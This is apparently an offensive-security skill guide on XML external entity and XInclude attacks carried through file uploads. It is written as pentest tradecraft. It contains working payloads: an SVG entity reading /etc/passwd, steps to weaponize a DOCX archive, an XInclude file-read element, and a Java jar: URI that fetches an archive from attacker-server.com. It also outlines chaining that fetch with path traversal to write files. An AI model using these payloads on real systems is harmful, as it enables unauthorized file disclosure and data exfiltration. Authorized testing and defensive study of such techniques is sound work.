# Upload-Based XXE & XInclude

## Why uploads matter: reaching parsers the direct API never exposed

A team can carefully harden every endpoint that explicitly accepts XML while never realizing that an image-upload or document-upload feature routes through a completely different, unhardened XML library. Always test upload features even on a target where direct XML endpoints look solid.

## SVG uploads

SVG is an XML format — any image upload feature that accepts SVG (or any image-processing library that *happens* to support SVG even if the UI only advertises PNG/JPEG) is XML attack surface:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```
If the application renders the SVG back as an image (rather than re-encoding it server-side into a different raster format, which would lose the injected text), you may be able to view the result directly. If not, fall back to the blind/OOB techniques.

## DOCX, XLSX, PPTX (Office Open XML)

These formats are a ZIP archive containing several internal XML files. To weaponize one:

```bash
# Unzip a legitimate, valid file of the target type
unzip legitimate.docx -d unzipped/

# Edit the relevant internal XML (word/document.xml for DOCX,
# xl/workbook.xml or a sheet XML for XLSX, similar for PPTX) and
# insert a DOCTYPE/entity declaration, e.g.:
#   <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
#   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
#   <w:document>...<w:t>&xxe;</w:t>...</w:document>

# Re-zip into a valid container
cd unzipped && zip -r ../malicious.docx .
```
Upload the resulting file through the application's normal document-upload feature. Since the document is rarely rendered back to you directly, this is almost always a blind scenario — go straight to OAST detection and the external-DTD exfiltration technique from `blind-xxe-and-oob-exfiltration.md`. Tools like `oxml_xxe` automate embedding XXE payloads across this whole family of formats (DOCX/XLSX/PPTX, ODT/ODS/ODP, and even SVG/PDF) rather than hand-editing each one.

## XInclude (when you can't inject a DOCTYPE at all)

Some injection points only let you control a single value *inside* an existing, otherwise-fixed XML document — a product ID field, a SOAP parameter, an attribute value — where you have no ability to add a `<!DOCTYPE>` declaration of your own. XInclude is a separate XML feature (not technically "XXE" in the strict DTD-entity sense, but functionally equivalent for your purposes) that doesn't require a DOCTYPE at all:

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```
If your controllable value sits inside an element that ends up being well-formed XML on its own (or if you can inject a full element rather than just text content), submitting the XInclude namespace declaration plus the include directive in place of your normal value can pull in file content without ever needing the entity-declaration machinery the rest of this skill relies on. This is specifically worth trying whenever you find an injection point too narrow for the standard DOCTYPE-based payloads.

## The Java `jar://` protocol (Java applications only)

If you've confirmed the backend is Java-based, the `jar:` URI scheme lets an external entity reference a file *inside* a ZIP/JAR archive, including one fetched remotely first:

```
jar:file:///var/myarchive.zip!/file.txt
jar:https://attacker-server.com/myarchive.zip!/file.txt
```
The parser downloads the archive to a temporary local path, extracts it, and reads the specified internal file — useful both as a way to smuggle a payload past filters that only inspect the immediately-visible entity value, and (more importantly) as a stepping stone: the downloaded archive lands in a predictable-pattern temporary location, and if you can also find or cause a separate path-traversal-capable sink elsewhere in the application, the two can sometimes be chained toward writing a file to an attacker-chosen location rather than just reading one.

## What makes an upload-based or XInclude finding confirmed, not theoretical

The same bar as basic XXE: real recovered file content, or a confirmed OAST interaction carrying real exfiltrated data, specifically tied to *your uploaded file or your single-value injection* having been processed — not just that the upload succeeded or that the request containing your XInclude payload returned a 200. If the platform re-encodes uploaded SVGs through a raster pipeline, or strips/validates the internal XML of Office documents before processing, your payload may never reach a vulnerable parser at all — confirm processing happened before concluding the technique failed or succeeded.
